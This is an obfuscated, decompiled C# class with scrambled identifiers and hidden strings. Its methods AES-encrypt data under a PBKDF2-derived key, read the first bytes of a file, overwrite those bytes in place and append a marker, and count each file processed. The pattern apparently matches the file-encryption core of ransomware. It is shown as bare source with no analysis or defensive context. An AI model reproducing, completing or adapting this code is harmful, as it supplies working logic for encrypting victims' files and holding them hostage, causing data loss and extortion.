using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace drXPuaQNZPOSPCS;

public static class qsVBtPrJSv
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] KiYWDoMxnom(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = gULbMslHOwEtkNcdf(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes gULbMslHOwEtkNcdf(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] onZydZdaURpY(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (OBRXLDkWsVk.lplqfXwOnNQxi == getString_0(107396940))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (OBRXLDkWsVk.ZQkgwClpBNRNGiD)
			{
				try
				{
					File.AppendAllText(OBRXLDkWsVk.LtQdcjdFVaR, getString_0(107387553) + string_0 + getString_0(107400777) + ex.Message + getString_0(107396658));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool lvDlvibtIHl(string HnqoYCdHvfu, byte[] uqGgpaIFQqSRvN, byte[] yLndxBtngveE = null)
	{
		try
		{
			byte[] array = null;
			if (OBRXLDkWsVk.lplqfXwOnNQxi == getString_0(107396940))
			{
				array = (OBRXLDkWsVk.yzxmjEHglZqnOW ? Encoding.ASCII.GetBytes(OBRXLDkWsVk.SptLhhxIveIbH(OBRXLDkWsVk.KRDJkBhvSnRX) + OBRXLDkWsVk.SptLhhxIveIbH(getString_0(107400719)) + Convert.ToString(OBRXLDkWsVk.JRjvEgYWmxeX) + OBRXLDkWsVk.SptLhhxIveIbH(getString_0(107400719))) : Encoding.ASCII.GetBytes(OBRXLDkWsVk.SptLhhxIveIbH(OBRXLDkWsVk.KRDJkBhvSnRX) + OBRXLDkWsVk.SptLhhxIveIbH(getString_0(107400760)) + Convert.ToString(OBRXLDkWsVk.JRjvEgYWmxeX) + OBRXLDkWsVk.SptLhhxIveIbH(getString_0(107400760))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(HnqoYCdHvfu, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(uqGgpaIFQqSRvN, 0, uqGgpaIFQqSRvN.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(HnqoYCdHvfu, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!OBRXLDkWsVk.yzxmjEHglZqnOW)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(yLndxBtngveE, 0, yLndxBtngveE.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (OBRXLDkWsVk.yzxmjEHglZqnOW ? Encoding.ASCII.GetBytes(OBRXLDkWsVk.SptLhhxIveIbH(OBRXLDkWsVk.KRDJkBhvSnRX) + OBRXLDkWsVk.SptLhhxIveIbH(getString_0(107400719)) + Convert.ToString(OBRXLDkWsVk.JRjvEgYWmxeX) + OBRXLDkWsVk.SptLhhxIveIbH(getString_0(107400719))) : Encoding.ASCII.GetBytes(OBRXLDkWsVk.SptLhhxIveIbH(OBRXLDkWsVk.KRDJkBhvSnRX) + OBRXLDkWsVk.SptLhhxIveIbH(getString_0(107400760)) + Convert.ToString(OBRXLDkWsVk.JRjvEgYWmxeX) + OBRXLDkWsVk.SptLhhxIveIbH(getString_0(107400760))));
				FileStream fileStream2 = new FileStream(HnqoYCdHvfu, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(uqGgpaIFQqSRvN, 0, uqGgpaIFQqSRvN.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(HnqoYCdHvfu, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!OBRXLDkWsVk.yzxmjEHglZqnOW)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(yLndxBtngveE, 0, yLndxBtngveE.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			OBRXLDkWsVk.bTxbPbZzsh++;
		}
		catch (Exception ex)
		{
			if (OBRXLDkWsVk.ZQkgwClpBNRNGiD)
			{
				try
				{
					File.AppendAllText(OBRXLDkWsVk.LtQdcjdFVaR, getString_0(107387553) + HnqoYCdHvfu + getString_0(107400742) + ex.Message + getString_0(107396658));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (OBRXLDkWsVk.yzxmjEHglZqnOW ? Encoding.ASCII.GetBytes(OBRXLDkWsVk.SptLhhxIveIbH(OBRXLDkWsVk.KRDJkBhvSnRX) + OBRXLDkWsVk.SptLhhxIveIbH(getString_0(107400719)) + Convert.ToString(OBRXLDkWsVk.JRjvEgYWmxeX) + OBRXLDkWsVk.SptLhhxIveIbH(getString_0(107400719))) : Encoding.ASCII.GetBytes(OBRXLDkWsVk.SptLhhxIveIbH(OBRXLDkWsVk.KRDJkBhvSnRX) + OBRXLDkWsVk.SptLhhxIveIbH(getString_0(107400760)) + Convert.ToString(OBRXLDkWsVk.JRjvEgYWmxeX) + OBRXLDkWsVk.SptLhhxIveIbH(getString_0(107400760))));
				FileStream fileStream4 = new FileStream(HnqoYCdHvfu, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(uqGgpaIFQqSRvN, 0, uqGgpaIFQqSRvN.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(HnqoYCdHvfu, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!OBRXLDkWsVk.yzxmjEHglZqnOW)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(yLndxBtngveE, 0, yLndxBtngveE.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static qsVBtPrJSv()
	{
		Strings.CreateGetStringDelegate(typeof(qsVBtPrJSv));
	}
}
